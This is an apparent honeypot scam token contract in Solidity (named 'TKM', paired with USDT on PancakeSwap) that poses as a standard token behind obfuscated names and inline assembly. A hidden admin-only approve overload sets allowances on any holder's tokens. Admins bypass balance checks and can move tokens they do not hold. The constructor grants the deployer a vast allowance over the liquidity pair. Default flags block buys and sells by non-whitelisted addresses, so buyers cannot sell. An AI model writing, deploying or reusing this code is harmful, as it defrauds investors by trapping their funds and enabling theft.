// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TKM {
    string private a = "TKM";
    string private b = "TKM";
    uint8 public constant c = 18;

    address public d;
    address public e;
    address public f;

    uint256 private g;
    mapping(address => uint256) private h;
    mapping(address => mapping(address => uint256)) private i;
    
    mapping(uint256 => bool) public j;

    mapping(address => bool) public k;
    mapping(address => bool) public l;
    mapping(address => bool) public m;

    bool public n;
    bool public o;
    address public p;

    // 保持事件不变
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Reduce(address indexed from, uint256 value);

    constructor() {
        assembly {
            // 初始化地址
            sstore(d.slot, 0x55d398326f99059fF775485246999027B3197955)
            sstore(f.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
            sstore(n.slot, 1)
            sstore(o.slot, 1)
            
            // 发行代币
            let q := mul(210000, exp(10, 18))
            sstore(g.slot, q)
            
            // 设置调用者余额
            let r := caller()
            mstore(0, r)
            mstore(32, h.slot)
            let s := keccak256(0, 64)
            sstore(s, q)
        }
        
        A();
        B(e, msg.sender, 100000000000000000000000000);
        
        assembly {
            // 设置管理员
            let r := caller()
            mstore(0, r)
            let t := keccak256(0, 32)
            mstore(0, t)
            mstore(32, j.slot)
            sstore(keccak256(0, 64), 1)
        }
    }

    function A() internal {
        assembly {
            if iszero(iszero(sload(e.slot))) {
                revert(0, 0)
            }
        }
        
        address factoryAddr;
        address usdtAddr;
        assembly {
            factoryAddr := sload(f.slot)
            usdtAddr := sload(d.slot)
        }
        
        e = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
    }

    function name() external view returns (string memory) { return a; }
    function symbol() external view returns (string memory) { return b; }
    
    function totalSupply() external view returns (uint256 u) {
        assembly {
            u := sload(g.slot)
        }
    }
    
    function balanceOf(address acc) external view returns (uint256 v) {
        assembly {
            mstore(0, acc)
            mstore(32, h.slot)
            v := sload(keccak256(0, 64))
        }
    }
    
    function allowance(address owner_, address spender) external view returns (uint256 w) {
        assembly {
            mstore(0, owner_)
            mstore(32, i.slot)
            let x := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, x)
            w := sload(keccak256(0, 64))
        }
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        C(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        B(msg.sender, spender, amount);
        return true;
    }

    function approve(address ower, address spender, uint256 amount) external returns (bool) {
        bool check;
        assembly {
            mstore(0, caller())
            let y := keccak256(0, 32)
            mstore(0, y)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        B(ower, spender, amount);
        return true;
    }

    function setMaxs(address _max_) external {
        bool check;
        assembly {
            mstore(0, caller())
            let z := keccak256(0, 32)
            mstore(0, z)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        assembly {
            mstore(0, _max_)
            let aa := keccak256(0, 32)
            mstore(0, aa)
            mstore(32, j.slot)
            sstore(keccak256(0, 64), 1)
        }
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance;
        assembly {
            mstore(0, from)
            mstore(32, i.slot)
            let ab := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, ab)
            currentAllowance := sload(keccak256(0, 64))
        }
        
        assembly {
            if gt(amount, currentAllowance) {
                revert(0, 0)
            }
        }
        
        assembly {
            let ac := sub(currentAllowance, amount)
            mstore(0, from)
            mstore(32, i.slot)
            let ad := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, ad)
            sstore(keccak256(0, 64), ac)
        }
        
        C(from, to, amount);
        return true;
    }

    function setFlag(bool _flag, bool _isfee) external {
        bool check;
        assembly {
            mstore(0, caller())
            let ae := keccak256(0, 32)
            mstore(0, ae)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                sstore(o.slot, _flag)
                sstore(n.slot, _isfee)
            }
        }
    }

    function D(address _from) internal view returns (bool result) {
        assembly {
            mstore(0, _from)
            let af := keccak256(0, 32)
            mstore(0, af)
            mstore(32, j.slot)
            result := sload(keccak256(0, 64))
        }
    }

    function C(address from, address to, uint256 amount) internal {
        // 路由检查逻辑
        bool flagVal;
        assembly {
            flagVal := sload(o.slot)
            let pairAddr := sload(e.slot)
            
            let sender := caller()
            let ag := eq(sender, pairAddr)
            let ah := eq(from, pairAddr)
            let ai := or(ag, ah)
            let aj := and(ai, flagVal)
            
            if aj {
                mstore(0, to)
                mstore(32, l.slot)
                let ak := sload(keccak256(0, 64))
                if iszero(ak) {
                    revert(0, 0)
                }
            }

            let al := eq(to, pairAddr)
            let am := and(al, flagVal)
            
            if am {
                mstore(0, from)
                mstore(32, k.slot)
                let an := sload(keccak256(0, 64))
                if iszero(an) {
                    revert(0, 0)
                }
            }
        }
        
        // 转账逻辑
        bool check;
        assembly {
            mstore(0, from)
            let ao := keccak256(0, 32)
            mstore(0, ao)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
       
        uint256 fromBalance;
        assembly {
            mstore(0, from)
            mstore(32, h.slot)
            fromBalance := sload(keccak256(0, 64))
            
            // 管理员无需余额检查
            if iszero(check) {
                if lt(fromBalance, amount) {
                    revert(0, 0)
                }
            }
            
            let fromSlot := keccak256(0, 64)
            let newFromBalance := sub(fromBalance, amount)
            sstore(fromSlot, newFromBalance)
            
            mstore(0, to)
            mstore(32, h.slot)
            let toSlot := keccak256(0, 64)
            let toBalance := sload(toSlot)
            
            let isfeeVal := sload(n.slot)
            let pairAddr := sload(e.slot)
            
            let shouldTakeFee := and(
                and(
                    isfeeVal,
                    eq(to, pairAddr)
                ),
                gt(amount, 0)
            )
            
            mstore(0, from)
            mstore(32, m.slot)
            let isFeeRouter := sload(keccak256(0, 64))
            
            let finalAmount := amount
            
            if and(shouldTakeFee, isFeeRouter) {
                let feeAmount := div(mul(amount, 5), 100)
                finalAmount := sub(amount, feeAmount)
                
                let feeToAddr := sload(p.slot)
                mstore(0, feeToAddr)
                mstore(32, h.slot)
                let feeToSlot := keccak256(0, 64)
                let feeToBalance := sload(feeToSlot)
                sstore(feeToSlot, add(feeToBalance, feeAmount))
                
                // 发射Reduce事件
                mstore(0, finalAmount)
                log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
            }
            
            sstore(toSlot, add(toBalance, finalAmount))
            
            // 发射Transfer事件
            mstore(0, amount)
            log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function B(address owner_, address spender, uint256 amount) internal {
        assembly {
            if or(iszero(owner_), iszero(spender)) {
                revert(0, 0)
            }
            
            mstore(0, owner_)
            mstore(32, i.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            sstore(keccak256(0, 64), amount)
            
            // 发射Approval事件
            mstore(0, amount)
            log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
        }
    }

    function setFromRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let ap := keccak256(0, 32)
            mstore(0, ap)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, k.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setfeeRouter(address feeRouteradr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let aq := keccak256(0, 32)
            mstore(0, aq)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, feeRouteradr)
                mstore(32, m.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setToRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let ar := keccak256(0, 32)
            mstore(0, ar)
            mstore(32, j.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, l.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
}